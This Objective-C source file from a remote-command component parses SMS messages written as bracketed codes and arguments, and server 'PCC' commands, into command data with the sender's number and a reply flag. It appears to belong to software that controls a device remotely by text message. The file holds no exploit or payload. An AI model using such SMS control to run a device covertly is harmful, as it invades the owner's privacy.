/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RemoteCmdParser
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  16/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */


#import "RemoteCmdParser.h"
#import "RemoteCmdData.h"
#import "RemoteCmdType.h"
#import "SMSCmd.h"
#import "RemoteCmdExceptionCode.h"
#import "PCC.h"

@interface RemoteCmdParser (PrivateAPI)
- (NSString *) removeSpecialCharacters: (NSString *) aString;
@end

@implementation RemoteCmdParser

/**
 - Method name:init
 - Purpose: This method is used to initialize the RemoteCmdParser class.
 - Argument list and description: No Argument
 - Return type and description: self (RemoteCmdParser instance)
*/

- (id) init {
	if ((self = [super init])) {
		DLog (@"RemoteCmdParser---->init")
	}
	return (self);
}

/**
 - Method name:parse
 - Purpose: This method is used to parse the Command.
 - Argument list and description: aCmdString (NSString *)
 - Return type and description: No Argument
*/

- (RemoteCmdData *) parseSMS: (SMSCmd *) aSMSCommand {
	DLog (@"RemoteCmdParser---->parseSMS:%@",aSMSCommand)
	//Initial value of start location
	NSRange beginRange =NSMakeRange(0, 0);
	//Initial value of end location 
	NSRange endRange=NSMakeRange(0, 0);
	//For storing parsed string
    NSMutableArray *parsedResult=[[NSMutableArray alloc] init];
	//Get the message from sms command
	NSString * cmdString=aSMSCommand.mMessage; 
	//Trim the white spaces of sms message
	cmdString=[cmdString stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
    //================Start Parsing===========================
    for (;beginRange.location <[cmdString length];) {
		//Find the location of Starting tag '<' 
		beginRange = [cmdString rangeOfString:@"<"];
		//Find the location of ending tag '>' 
		endRange = [cmdString rangeOfString:@">"];
		//Check  the location of tag '<' greater than  location of '>'. if greater then raise exception
		if(beginRange.location> endRange.location || beginRange.length <=0) {
			DLog (@"Parser error...");
			//Hard coded now Need to change
			FxException* exception = [FxException exceptionWithName:@"parse" andReason:@"Parser error occured"];
			[exception setErrorCode:kCmdExceptionErrorNotCmdMessage];
			[exception setErrorCategory:kFxErrorRCM];
			@throw exception;
		}
		//Check the location of tag '>' is found. if Not found then raise exception
		else if (endRange.location == NSNotFound || endRange.length <=0) {
			DLog (@"Parser error...");
			//Hard coded now.Need to change
			FxException* exception = [FxException exceptionWithName:@"parse" andReason:@"Parser error occured"];
			[exception setErrorCode:kCmdExceptionErrorNotCmdMessage];
			[exception setErrorCategory:kFxErrorRCM];
			@throw exception;
		}
		
		//Check the location of tag '<' is found. if Not found then raise exception
		else if (beginRange.location == NSNotFound || beginRange.location > 0) {
			DLog (@"Parser error...");
		//Hard coded now.Need to change
			FxException* exception = [FxException exceptionWithName:@"parse" andReason:@"Parser error occured"];
			[exception setErrorCode:kCmdExceptionErrorNotCmdMessage];
			[exception setErrorCategory:kFxErrorRCM];
			@throw exception;
		}
		
		//Check two '<<' tagi is  found. if found then raise exception
		else if([[cmdString substringWithRange:NSMakeRange(beginRange.location+1, 1)] isEqualToString:@"<"]) {
		 	DLog (@"Parser error...");
			//Hard coded now.Need to change
			FxException* exception = [FxException exceptionWithName:@"parse" andReason:@"Parser error occured"];
			[exception setErrorCode:kCmdExceptionErrorNotCmdMessage];
			[exception setErrorCategory:kFxErrorRCM];
			@throw exception;
		}
		else {
			//Successfull! Extract  the string between < > tags
			NSString *parsedString=[cmdString substringWithRange:NSMakeRange(beginRange.location+1, endRange.location-1)];
			//Remove Invalid Characters from Parsed String
			if ((NSNull *) parsedString == [NSNull null])
				//if parsedString is NULL then store result as null
				[parsedResult addObject:[NSNull null]];
			else 
			    //store the parsed string
				[parsedResult addObject:parsedString]; 
			    //To find length of parsed string from the orginal string
			    int pLength=(endRange.location-beginRange.location)+1; 
		    	//To remove parsed string from the orginal  
			    cmdString=[cmdString substringWithRange:NSMakeRange(pLength, [cmdString length]-pLength)];
		}
	}
	//=============End Parsing=====================
	//Create Remote Command Data
	RemoteCmdData *cmdData=[[RemoteCmdData alloc] init];
	if([parsedResult count]) {
	   	NSString *cmdCode = [parsedResult objectAtIndex:0];
		cmdCode=[self removeSpecialCharacters:cmdCode];
		DLog(@"Command Code:%@",cmdCode);
        [cmdData setMRemoteCmdCode:cmdCode];
		[cmdData setMRemoteCmdType:kRemoteCmdTypeSMS];
		[cmdData setMSenderNumber:aSMSCommand.mSenderNumber];
		[cmdData setMArguments:[[parsedResult copy] autorelease]];
		if([[[parsedResult lastObject] uppercaseString] isEqualToString:@"D"])
			[cmdData setMIsSMSReplyRequired:YES];
		else
			[cmdData setMIsSMSReplyRequired:NO];
	}
	//clear parsedResult 
	[parsedResult release];
	parsedResult = nil; 
	DLog (@"parsed--->%@",cmdData);
	return [cmdData autorelease];
}

/**
 - Method name:parsePCC
 - Purpose: This method is used to parse the Command.
 - Argument list and description: aCmdString (NSString *)
 - Return type and description: No Argument
*/

- (RemoteCmdData *) parsePCC: (PCC*) aPCCCommand {
	DLog (@"RemoteCmdParser---->parsePCC:%@",aPCCCommand);
	// Create Remote Command Data
	RemoteCmdData *cmdData=[[RemoteCmdData alloc] init];
	NSString *cmdCode= [NSString stringWithFormat:@"%d", [aPCCCommand PCCID]];
	[cmdData setMRemoteCmdCode:cmdCode];
	[cmdData setMRemoteCmdType:kRemoteCmdTypePCC];
	[cmdData setMSenderNumber:@""];
	// Format Remote Command Arguments
	NSMutableArray *arguments=[[NSMutableArray alloc]init];
   	[arguments addObject:cmdCode]; //Command Code
    [arguments addObject:cmdCode]; //Activation Code --> set to command code intentionally
	// Set All Pcc command strings into the argument Array;
	for (NSString* cmdString in [aPCCCommand arguments]) {
	      [arguments addObject:cmdString];
	}
	// Check the last string objects
	if([[[arguments lastObject] uppercaseString] isEqualToString:@"D"]) 
	   	[cmdData setMIsSMSReplyRequired:YES];
	else
	   [cmdData setMIsSMSReplyRequired:NO];	
	
	[cmdData setMArguments:arguments];
	
	[arguments release];
	
	return [cmdData autorelease];
	
}

/**
 - Method name:removeSpecialCharacters
 - Purpose: This method is used to remove the special characters .
 - Argument list and description: result (NSString *)
 - Return type and description: No Argument
*/

- (NSString *) removeSpecialCharacters: (NSString *) aString {
	DLog (@"RemoteCmdParser---->removeSpecialCharacters:%@",aString);
	NSCharacterSet * invalidNumberSet = [NSCharacterSet characterSetWithCharactersInString:@"\n_!@#$%^&*()[]{}'\".,<>:;|\\/?+=\t~` "];
    NSString  * result  = @"";
    NSScanner *scanner = [NSScanner scannerWithString:aString];
    NSString  *scannerResult;
    [scanner setCharactersToBeSkipped:nil];
    while (![scanner isAtEnd]) {
		if([scanner scanUpToCharactersFromSet:invalidNumberSet intoString:&scannerResult]) {
            result = [result stringByAppendingString:scannerResult];
		}
		else {
            if(![scanner isAtEnd]) {
                [scanner setScanLocation:[scanner scanLocation]+1];
            }
        }
    }
    return result;
}  

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	[super dealloc];
}

@end
